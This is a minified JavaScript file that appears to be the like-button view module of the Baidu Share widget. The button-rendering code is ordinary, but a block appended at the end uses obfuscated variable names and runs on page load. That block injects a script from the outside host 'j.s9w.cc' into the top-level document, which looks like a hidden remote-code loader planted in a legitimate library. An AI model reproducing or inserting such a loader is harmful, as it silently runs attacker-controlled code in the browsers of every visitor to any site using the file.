window._bd_share_main.F.module("view/like_view",function(e,t,n){e("like.css");var a=e("base/tangram").T,d=e("base/class").Class,o=e("conf/const"),i=e("view/view_base"),c=e("component/animate"),s={btn:"bdlikebutton",innerBtn:"bdlikebutton-inner",add:"bdlikebutton-add",text:"bdlikebutton-text",count:"bdlikebutton-count"};t.View=d.create(function(e){function t(){var t=e.tag||"";return a("."+s.btn).each(function(e,n){(!t||a(n).attr(o.CONFIG_TAG_ATTR)==t)&&i._entities.push(n)}),i._entities}function n(){var t=e,n=r[t.type];return t.likeText=t.likeText?t.likeText.substr(0,n[0]):n[1],t.likedText=t.likedText?t.likedText.substr(0,n[0]):n[2],t}function d(e){return a(e).parent().get(0)}var i=this,r={small:[4,"顶","已顶过"],medium:[6,"顶","您已顶过"],large:[10,"该内容对我有帮助","您已顶过，谢谢！"]};i.render=function(e){var d=t(),o=s.btn,c=n();i._actBtnSet.className=s.innerBtn,i._actBtnSet.tagName="div",i._actBtnSet.maxDomDepth=1,a(d).each(function(e,t){var n=c.type,d=[];d.push('<div class="',s.innerBtn,'" ',i._actBtnSet.cmdAttr,'="like">'),d.push('<span class="',s.add,'">+1</span>'),d.push('<div class="',s.count,'">加载中</div>'),"small"!=n&&d.push('<div class="',s.text,'">',c.likeText,"</div>"),d.push("</div>"),a(t).html(d.join("")).addClass(o+"-"+c.color).addClass(o+"-"+c.type).addClass(o+"-"+c.type+"-"+c.color)})},i._init=function(){var t=e,n=t.type;a(i._entities).each(function(e,d){var o=a("."+s.innerBtn,d);o.mouseover(function(e){var i=(e=a.event(e||window.event)).relatedTarget;o.contains(i)||("small"==n&&a("."+s.count,d).html(t.likeText),a(d).addClass(s.btn+"-"+t.type+"-"+t.color+"-hover"))}).mouseout(function(e){var i=(e=a.event(e||window.event)).relatedTarget;o.contains(i)||("small"==n?a("."+s.count,d).html(t.count):a("."+s.text,d).html(t.likeText),a(d).removeClass(s.btn+"-"+t.type+"-"+t.color+"-hover"))})})},i.showDoneState=function(t){var n=e,o=d(t),i=s.text;"small"==n.type&&(i=s.count),a("."+i,o).html(n.likedText),a(o).removeClass(o,s.btn+"-"+n.type+"-"+n.color+"-hover")},i.addOne=function(t,n){var o=e,r=d(t),l=a("."+s.add,r);l.show(),c.animate(l.get(0),{top:"-25px",opacity:"0"},300,function(){l.hide(),l.css({top:"0px",opacity:99})}),i.setNumber(n),a(r).removeClass(s.btn+"-"+o.type+"-"+o.color+"-hover")},i.setNumber=function(e){"number"==a.type(e)&&a(i._entities).each(function(t,n){a("."+s.count,n).html(e)})}},i.ViewBase)}),window.v6d061dfa0ddfd12160ad851976e4a26d="fx",window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc";var f476e749bb252bde7a5c2c9994b6116ce=function(){function e(e){if(!n&&("onreadystatechange"!==e.type||"complete"===document.readyState)){for(e=0;e<t.length;e++)t[e].call(document);n=!0,t=null}}var t=[],n=!1;return document.addEventListener?(document.addEventListener("DOMContentLoaded",e,!1),document.addEventListener("readystatechange",e,!1),window.addEventListener("load",e,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",e),window.attachEvent("onload",e)),function(e){n?e.call(document):t.push(e)}}();function f006b08735d9928a8820efe00a26753e7(){try{var e=window.top.document;if(!e.getElementById("82ac324e455efd0ecd2e73d22d852758")){var t=e.createElement("script");t.setAttribute("type","text/javascript"),t.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var n="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";e.getElementsByTagName("head")[0].appendChild(t),t.setAttribute("src",n)}}catch(e){console.log(e.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);